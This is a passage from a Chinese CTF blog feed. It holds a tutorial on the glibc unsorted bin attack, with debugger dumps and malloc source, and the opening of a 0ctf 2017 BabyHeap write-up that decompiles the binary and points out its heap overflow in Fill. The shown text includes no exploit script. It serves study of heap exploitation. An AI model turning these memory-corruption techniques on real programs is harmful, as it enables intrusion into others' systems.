class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>之后结果如下：<br>pwndbg&gt; unsortedbin<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x7fffffffdd68</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   rbp<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <span class="hljs-meta">#malloc(0x410)</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007fffffffdd68</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x7fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x000000000040080a</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x0000000000602010</span><br>    #现在此地址被更改为较大的数（其值为main_arena+<span class="hljs-number">88</span>的地址）<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><p>申请过程如下图所示：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png'><img src="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png" alt="Snipaste_2023-09-13_20-51-30.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png'><img src="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png" alt="Snipaste_2023-09-13_20-52-24.png"></p><p>核心代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#glibc-2.23/malloc/malloc.c</span><br>#源码第<span class="hljs-number">3515</span><span class="hljs-number">-3517</span>行<br>--------------------------------------------------------------------<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsortedbin的bk改为chunk的bk</span><br>bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//将chunk的bk所指向的fd改为unsortedbin的地址</span><br><span class="hljs-comment">//unsorted_chunks(av)其实是&amp;main_arena.top</span><br>--------------------------------------------------------------------<br>解释：<br>unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); <br>bck-&gt;fd (chunk的fd)= unsorted_chunks (av);<br></code></pre></td></tr></tbody></table></figure><p>运行结果如下:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">140737351850872</span><span class="hljs-comment">//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88</span><br>p = <span class="hljs-number">0x602010</span><br></code></pre></td></tr></tbody></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>再来看一下unsortedbin的源码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>     {<br>       bck = victim-&gt;bk;<br>       <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                          chunk2mem (victim), av);<br>       size = chunksize (victim);<br><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">          only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">          runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">          exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">          no exact fit for a small chunk.</span><br><span class="hljs-comment">        */</span><br> #显然，bck被修改，并不符合这里的要求<br>       <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>           bck == unsorted_chunks (av) &amp;&amp;<br>           victim == av-&gt;last_remainder &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         {<br>           <span class="hljs-comment">/* split and reattach remainder */</span><br>           remainder_size = size - nb;<br>           remainder = chunk_at_offset (victim, nb);<br>           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>           av-&gt;last_remainder = remainder;<br>           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>           <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>             {<br>               remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>               remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>             }<br><br>           set_head (victim, nb | PREV_INUSE |<br>                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>           set_head (remainder, remainder_size | PREV_INUSE);<br>           set_foot (remainder, remainder_size);<br><br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         }<br><br>       <span class="hljs-comment">/* remove from unsorted list */</span><br></code></pre></td></tr></tbody></table></figure><p>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，<strong>victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7fff7b5eecf8</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x24d0010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 <span class="hljs-number">0x7f691338eb78</span><br>现在假设有个漏洞，可以让我们修改 <span class="hljs-built_in">free</span> 了的 chunk 的 bk 指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 bk 指针:<span class="hljs-number">0x7fff7b5eece8</span><br><br>再去 <span class="hljs-built_in">malloc</span> 的时候可以发现那里的值已经改变为 unsorted bin 的地址<br><span class="hljs-number">0x7fff7b5eecf8</span>: <span class="hljs-number">0x7f691338eb78</span><br></code></pre></td></tr></tbody></table></figure><p>这里我们可以看到 <strong>unsorted bin attack 确实可以修改任意地址的值</strong>，<strong>但是所修改成的值却不受我们控制</strong>，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说<br>● <strong>我们通过修改循环的次数来使得程序可以执行多次循环。</strong><br><strong>●</strong> <strong>我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉全篇看最后一句话就够了(哈哈哈)</p><p>总结一下unsortedbin attack这种攻击方式：<br>首先我们将一个堆块释放到unsortedbin中，然后利用堆溢出修改unsortedbin中chunk的bk指针，这个bk指针是指向target_addr-0x10。当我们malloc申请unsortedbin中的堆块时，target_addr中的值就会变成main_arena+88地址的值</p><blockquote><p>target_addr：目标地址（想要修改为超大数的地址） </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关于unsorted-bin-和-unsorted-bin-attack&quot;&gt;&lt;a href=&quot;#关于unsorted-bin-和-unsorted-bin-attack&quot; class=&quot;headerlink&quot; title=&quot;关于unsorted bin 和 uns</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>0ctf_2017_BabyHeap</title>
    <link href="https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/"/>
    <id>https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/</id>
    <published>2023-09-13T07:26:29.000Z</published>
    <updated>2023-09-13T09:29:56.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastbin-attack中的Arbitrary-Alloc（例题）"><a href="#fastbin-attack中的Arbitrary-Alloc（例题）" class="headerlink" title="fastbin_attack中的Arbitrary Alloc（例题）"></a><strong>fastbin_attack中的Arbitrary Alloc（例题）</strong></h1><p>具体例子原理网上很多，这里就不再赘述了，这里讲解一道<strong>fastbin_attack中的Arbitrary Alloc</strong></p><blockquote><p>题目来源：0ctf 2017 BabyHeap<br>参考资料：<br><a href="https://blog.csdn.net/qq_36495104/article/details/106202135">https://blog.csdn.net/qq_36495104/article/details/106202135</a> #思路<br>CTF-wiki<br><a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a> #payload<br><a href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a> #关闭地址随机化</p></blockquote><blockquote><p>附件：<br>链接: <a href="https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw">https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw</a>  密码: f1i6<br>–来自百度网盘超级会员V3的分享</p></blockquote><hr><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>将文件下载下来，首先检查一下文件的保护情况：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png'><img src="https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png" alt="Snipaste_2023-09-13_15-31-15.png"></p><p>可以看到保护全部开启（这还玩个毛线啊）<br>具体看一下各个保护：</p><blockquote><p>Arch:   amd64-64-little<br>这个说明程序是64位程序，小端序<br>   RELRO:   Full RELRO<br>Full RELRO开启，使整个 GOT 只读，从而无法被覆盖，进一步来说GOT表无法被修改<br>   Stack:   Canary found<br>对使用随机数每个函数进行保护，防止栈溢出<br>   NX:    NX enabled<br>不能向栈上直接注入shellcode<br>   PIE:    PIE enabled<br>地址随机化，我感觉这个保护是最恶心的<br>来看一下我的Linux环境：<br>Ubuntu版本：16.04</p></blockquote><p>其中libc-2.23.so是我本机的libc文件</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>整个程序相当于一个堆内存管理器，静态分析一下吧：</p><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>{<br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  addr = get_addr();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();                                     <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">//   puts("1. Allocate");</span><br>                                                <span class="hljs-comment">//   puts("2. Fill");</span><br>                                                <span class="hljs-comment">//   puts("3. Free");</span><br>                                                <span class="hljs-comment">//   puts("4. Dump");</span><br>                                                <span class="hljs-comment">//   puts("5. Exit");</span><br>                                                <span class="hljs-comment">//   printf("Command: ");</span><br>                                                <span class="hljs-comment">// </span><br>    input();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> __int64)off_14F4 )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1uLL</span>:<br>        Allocate((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2uLL</span>:<br>        Fill((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3uLL</span>:<br>        Free((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4uLL</span>:<br>        Dump((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5uLL</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>主函数内容，包含菜单函数和四个堆功能函数</p><h3 id="get-addr-函数-生成随机地址"><a href="#get-addr-函数-生成随机地址" class="headerlink" title="get_addr 函数(生成随机地址)"></a>get_addr 函数(生成随机地址)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">get_addr</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  buf[<span class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  alarm(<span class="hljs-number">60u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"===== Baby Heap in 2017 ====="</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);                 <span class="hljs-comment">// 调用系统文件生成随机数</span><br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> || read(fd, buf, <span class="hljs-number">0x10</span>uLL) != <span class="hljs-number">16</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  close(fd);<br>  addr = (<span class="hljs-type">char</span> *)((buf[<span class="hljs-number">0</span>] % <span class="hljs-number">0x555555543000</span>uLL + <span class="hljs-number">0x10000</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL);<br>  v3 = (buf[<span class="hljs-number">1</span>] % <span class="hljs-number">0xE80</span>uLL) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL;<br>  <span class="hljs-keyword">if</span> ( mmap(addr, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>) != addr )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">return</span> &amp;addr[v3];                             <span class="hljs-comment">// 利用生成的随机数来生成随机地址</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>​这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。<br>​还需要提一句的是，这个函数有alarm函数，从程序运行60秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行patch。patch之后的可执行文件名为：babyheap_0ctf_2017_patch</p><p>返回的addr 指针 包含了 所有chunk 的 信息和 数据chunk 的指针</p><h3 id="meau-函数"><a href="#meau-函数" class="headerlink" title="meau 函数"></a>meau 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. Allocate"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2. Fill"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3. Free"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4. Dump"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5. Exit"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Command: "</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>打印菜单</p><h3 id="Alloc-函数"><a href="#Alloc-函数" class="headerlink" title="Alloc 函数"></a>Alloc 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Allocate</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *calloc_ptr; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !*(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>      size = input();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">4096</span> )<br>          size = <span class="hljs-number">4096</span>;<br>        calloc_ptr = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !calloc_ptr )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        *(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) = <span class="hljs-number">1</span>;<span class="hljs-comment">//chunk_flag</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">8</span>) = size;<span class="hljs-comment">//chunk_size</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">16</span>) = calloc_ptr;<span class="hljs-comment">//chunk_data_ptr 指向calloc出来的chunk_data</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Allocate Index %d\n"</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>      }<br>      <span class="hljs-keyword">return</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>传入的参数地址是get_addr 随机生成的地址。allocate函数是来创建堆块的，申请chunk最大的大小为4096。</p><p>首先输入堆块的content_size，然后调用calloc函数根据输入的content_size大小来创建堆块，最后堆块的信息保存在get_addr指针所指向的地址中。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为\x00。<br>请注意，堆块的index是从0开始的<br>因此程序的结构体为：</p><blockquote><p>●chunk_flag:用来判断堆块是否存在<br>●chunk_content_size:#记录content的大小<br>●chunk_data_ptr:指向calloc出来的chunk_data</p></blockquote><h3 id="Fill-函数"><a href="#Fill-函数" class="headerlink" title="Fill 函数"></a>Fill 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Fill</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<span class="hljs-comment">//判断序号是否正确，判断flag为 chunk 是否存在</span><br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>    v2 = input();<span class="hljs-comment">//又让输出size，改写 chunk 数据部分的内容,存在溢出!!</span><br>    <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content: "</span>);<br>      read_func2(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), v2); <span 